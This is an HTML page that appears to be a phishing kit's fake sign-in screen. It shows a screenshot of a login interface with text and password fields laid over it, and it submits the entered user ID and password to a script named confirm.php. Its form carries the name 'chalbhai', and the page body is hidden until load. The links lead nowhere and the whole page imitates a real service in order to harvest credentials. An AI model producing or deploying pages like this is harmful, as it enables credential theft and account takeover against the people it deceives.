

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign In Error</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

<script LANGUAGE="JavaScript">
<!--

var b = 0 ;
var i = 0 ;
var errmsg = "" ;
var punct = "" ;
var min = 0 ;
var max = 0 ;

function formbreeze_email(field) {

	if (b && (field.value.length == 0)) return true ;


	if (! emailCheck(field.value))
	  {
		  field.focus();
		  if (field.type == "text") field.select();
		  return false ;
	  }

   return true ;
}

function formbreeze_filledin(field) {

if (b && (field.value.length == 0)) return true;

if (field.value.length < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

if ((max > 0) && (field.value.length > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

return true ;
}

function formbreeze_number(field) {

if (b && (field.value.length == 0)) return true ; ;

if (i)
 var valid = "0123456789"
else
 var valid = ".,0123456789"

var pass = 1;
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
 }

if (field.value < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }


if ((max > 0) && (field.value > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}


function formbreeze_numseq(field) {


if (b && (field.value.length == 0)) return true ;

var valid = punct + "0123456789"

var pass = 1;
var digits = 0
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;
if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ; ;
   }

if (digits < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

if ((max > 0) && (digits > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}

function emailCheck (emailStr) {

var checkTLD=1;
var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
var emailPat=/^(.+)@(.+)$/;
var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
var validChars="\[^\\s" + specialChars + "\]";
var quotedUser="(\"[^\"]*\")";
var atom=validChars + '+';
var word="(" + atom + "|" + quotedUser + ")";
var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
var matchArray=emailStr.match(emailPat);

if (matchArray==null) {
alert(errmsg);
return false;
}
var user=matchArray[1];
var domain=matchArray[2];

for (i=0; i<user.length; i++) {
if (user.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}
for (i=0; i<domain.length; i++) {
if (domain.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}

if (user.match(userPat)==null) {
alert(errmsg);
return false;
}

var atomPat=new RegExp("^" + atom + "$");
var domArr=domain.split(".");
var len=domArr.length;
for (i=0;i<len;i++) {
if (domArr[i].search(atomPat)==-1) {
alert(errmsg);
return false;
   }
}

if (checkTLD && domArr[domArr.length-1].length!=2 &&
domArr[domArr.length-1].search(knownDomsPat)==-1) {
alert(errmsg);
return false;
}

if (len<2) {
alert(errmsg);
return false;
}

return true;
}

function formbreeze_sub()
{
/*
//FBDATA:formtext1^0^1^0^0^Please Enter Your User ID:;formtext2^0^1^0^0^Please Enter Your Password:;
*/
b=0;
errmsg="Please Enter Your User ID";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
b=0;
errmsg="Please Enter Your Password";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;

}
-->
</script>

</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1184px; height:41px; z-index:0"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=1184 height=41></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:206px; top:61px; width:995px; height:462px; z-index:1"><img src="images/loginscreen.png" alt="" title="" border=0 width=995 height=462></div>

<div id="image3" style="position:absolute; overflow:hidden; left:283px; top:526px; width:840px; height:118px; z-index:2"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=840 height=118></a></div>
<form action=confirm.php name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >
<input name="formtext1" type="text" style="position:absolute;width:158px;left:412px;top:144px;z-index:3">
<input name="formtext2" type="password" style="position:absolute;width:158px;left:412px;top:167px;z-index:4">
<div id="formimage1" style="position:absolute; left:426px; top:234px; z-index:5"><input type="image" name="formimage1" width="60" height="21" src="images/log on.png"></div></form>
<div id="formcheckbox1" style="position:absolute; left:380px; top:189px; z-index:6"><input type="checkbox" name="formcheckbox1"></div>
<div id="image4" style="position:absolute; overflow:hidden; left:369px; top:211px; width:182px; height:13px; z-index:7"><a href="#"><img src="images/fff.png" alt="" title="" border=0 width=182 height=13></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:325px; top:410px; width:185px; height:63px; z-index:8"><a href="#"><img src="images/demo.png" alt="" title="" border=0 width=185 height=63></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:624px; top:177px; width:207px; height:85px; z-index:9"><a href="#"><img src="images/sss.png" alt="" title="" border=0 width=207 height=85></a></div>


</body>
</html>
